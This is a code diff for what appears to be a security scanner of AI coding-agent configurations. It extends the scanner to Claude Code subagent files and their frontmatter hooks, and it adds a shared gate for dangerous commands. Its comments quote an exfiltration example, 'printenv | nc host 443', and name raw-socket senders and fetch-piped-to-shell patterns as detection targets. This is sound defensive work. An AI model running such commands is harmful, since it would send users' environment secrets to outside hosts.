@@ -63,8 +63,13 @@ impl PluginContext {
         ctx
     }
 
+    /// Installed plugin versions: (installPath, plugin, marketplace), under `cache/`.
+    pub(crate) fn install_paths(&self) -> &[(PathBuf, String, String)] {
+        &self.install_paths
+    }
+
     /// Provenance of a path under `~/.claude/plugins` or `~/.claude/skills/synced`.
-    fn provenance(&self, path: &Path) -> Option<SkillProvenance> {
+    pub(crate) fn provenance(&self, path: &Path) -> Option<SkillProvenance> {
         let synced_root = self.home.join(".claude").join("skills").join("synced");
         if path.starts_with(&synced_root) {
             return Some(SkillProvenance { synced: true, ..Default::default() });
@@ -136,6 +141,14 @@ impl Scanner for SkillsScanner {
         for (root, dir) in &project_dirs {
             let project_commands = dir.join(".claude").join("commands");
             scan_skill_dir(&project_commands, "claude-code", "project", Some(root), &ctx, &mut results);
+        }
+
+        // Claude Code subagents: ~/.claude/agents/*.md and <proj>/.claude/agents/*.md, whose
+        // frontmatter may declare hooks. Plugin agents are not walked: Claude Code ignores
+        // their hooks (code.claude.com/docs/en/sub-agents).
+        scan_skill_dir(&home.join(".claude").join("agents"), "claude-code-agent", "global", None, &ctx, &mut results);
+        for (root, dir) in &project_dirs {
+            scan_skill_dir(&dir.join(".claude").join("agents"), "claude-code-agent", "project", Some(root), &ctx, &mut results);
         }
 
         // Claude Code hooks: ~/.claude/hooks/ and project-level .claude/hooks/
@@ -655,9 +668,20 @@ fn build_skill(
             unrestricted_bash = grants_unrestricted_shell(&parse_allowed_tools(fm));
         }
     }
+    // Frontmatter `hooks:` register when the skill, command or subagent runs
+    // (code.claude.com/docs/en/hooks#hooks-in-skills-and-agents).
+    let mut hooks = Vec::new();
+    if (analyze || file_type == "agent")
+        && let Some(text) = content.as_deref()
+        && let Some(fm) = frontmatter(text)
+    {
+        let skill_dir = path.parent().unwrap_or(Path::new("."));
+        let plugin_root = ctx.plugin_root(path);
+        hooks = frontmatter_hooks(fm, path, skill_dir, plugin_root.as_deref());
+    }
     let mut provenance = ctx.provenance(path);
     if scope == "project"
-        && (unrestricted_bash || !dynamic_commands.is_empty())
+        && (unrestricted_bash || !dynamic_commands.is_empty() || !hooks.is_empty())
         && let Some(root) = project_root
         && crate::scanners::probe_exists(&root.join(".git"))
     {
@@ -692,7 +716,29 @@ fn build_skill(
         dynamic_commands,
         unrestricted_bash,
         provenance,
+        hooks,
     }
+}
+
+/// The `hooks:` map of a skill, command or subagent file's YAML frontmatter, parsed with
+/// the settings hook model. `skill_dir` is what `${CLAUDE_SKILL_DIR}` expands to; a
+/// plugin skill also expands the plugin-root placeholders.
+pub fn frontmatter_hooks(fm: &str, path: &Path, skill_dir: &Path, plugin_root: Option<&Path>) -> Vec<crate::models::AgentHook> {
+    use crate::scanners::hook_sources::{claude_plugin_vars, extract_hook_map, Dialect, HookCtx};
+    if fm.len() > MAX_FRONTMATTER {
+        return Vec::new();
+    }
+    let Ok(v) = serde_yaml_ng::from_str::<serde_json::Value>(fm) else { return Vec::new() };
+    let Some(map) = v.get("hooks") else { return Vec::new() };
+    let mut ctx = HookCtx::new(path, Dialect::Claude);
+    ctx.own_dir = Some(".claude");
+    ctx.vars.push(("${CLAUDE_SKILL_DIR}", skill_dir.to_path_buf()));
+    if let Some(root) = plugin_root {
+        ctx.root = Some(root);
+        ctx.root_label = "plugin";
+        ctx.vars.extend(claude_plugin_vars(root));
+    }
+    extract_hook_map(map, &ctx)
 }
 
 /// Whether a project skill file is committed. A file reached through a committed
@@ -964,6 +1010,8 @@ fn scan_skill_dir(
     };
     // `commands/` holds custom slash commands, which support dynamic context too.
     let is_commands_dir = dir.file_name().is_some_and(|n| n == "commands");
+    // `agents/` holds subagent definitions: markdown only.
+    let is_agents_dir = dir.file_name().is_some_and(|n| n == "agents");
 
     for entry in entries.flatten() {
         let path = entry.path();
@@ -984,6 +1032,9 @@ fn scan_skill_dir(
 
         // Only scan known skill file types
         if !matches!(ext, "md" | "txt" | "yaml" | "yml" | "json" | "sh" | "bash" | "py" | "js" | "ts") {
+            continue;
+        }
+        if is_agents_dir && ext != "md" {
             continue;
         }
         // ~/.codex holds the Codex credential and state files beside its hook files:
@@ -1015,7 +1066,7 @@ fn scan_skill_dir(
         results.push(build_skill(
             &path,
             name,
-            ext.to_string(),
+            if is_agents_dir { "agent".to_string() } else { ext.to_string() },
             is_commands_dir && ext == "md",
             read,
             framework,
@@ -1093,7 +1144,10 @@ fn body_after_frontmatter(text: &str) -> &str {
 /// hands data to a network sender ([`feeds_network_sender`]): `printenv | nc host 443`
 /// is the exfiltration the row is named after, not a lookup. Data piped to a raw socket
 /// (nc, socat, telnet, `/dev/tcp`) is an exfiltration hit even when no row matched.
-fn dynamic_command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
+///
+/// This is the one gate for skill dynamic commands and command-type hooks of every agent:
+/// a hit of severity critical or high makes the command dangerous.
+pub(crate) fn command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
     let mut hits: Vec<crate::models::RulesFileFinding> = crate::scanners::rules_files::check_dangerous_patterns(cmd)
         .into_iter()
         .filter(|f| {
@@ -1123,6 +1177,22 @@ fn dynamic_command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
         }
     }
     hits
+}
+
+fn dynamic_command_hits(cmd: &str) -> Vec<crate::models::RulesFileFinding> {
+    command_hits(cmd)
+}
+
+/// The dangerous-pattern rows that make a hook MODULE's source (a Claude Code mod, an
+/// OpenCode plugin) dangerous: critical rows matched on the raw text only. A module is
+/// ordinary program code, so `child_process`, `exec(` and an `API_KEY` name are what it
+/// normally contains; a fetch piped to a shell, a decode into a shell, a listener or a
+/// credential file sent to the network are not.
+pub(crate) fn module_source_dangerous(src: &str) -> Vec<crate::models::RulesFileFinding> {
+    crate::scanners::rules_files::check_dangerous_patterns(src)
+        .into_iter()
+        .filter(|f| f.severity == "critical" && !f.pattern.contains("(obfuscated"))
+        .collect()
 }
 
 /// Raw network socket clients: they only ever send what they are given.
